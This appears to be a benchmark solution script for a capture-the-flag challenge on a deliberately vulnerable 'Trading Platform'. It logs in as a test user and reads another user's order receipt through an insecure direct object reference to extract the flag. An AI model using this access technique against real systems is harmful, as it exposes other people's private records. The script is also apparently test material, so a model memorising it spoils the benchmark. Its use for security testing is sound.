#!/usr/bin/env bash
# XBEN-001-24 — "Trading Platform" (tags: idor)
#
# Proxy-mode twin of examples/xben/xben-001-order-receipt-idor.sh.
# `/order/<id>/receipt` renders the order the URL names; the logged-in user
# decides only whether a receipt is shown, never which one. So any authenticated
# session can read any order. Order 300401 belongs to someone else and its
# receipt is the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
ORDER="${2:-300401}"
SESSION="xben001p-$$"
cd "$(dirname "$0")"
. ./_proxy-lib.sh
proxy_start "$URL/"

go "$URL/"
BASE="$(req_of GET /)"
# Log in as the account we are given, so the session holds a real cookie.
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null
# Ask for a receipt that is not ours.
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set "path=/order/$ORDER/receipt" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
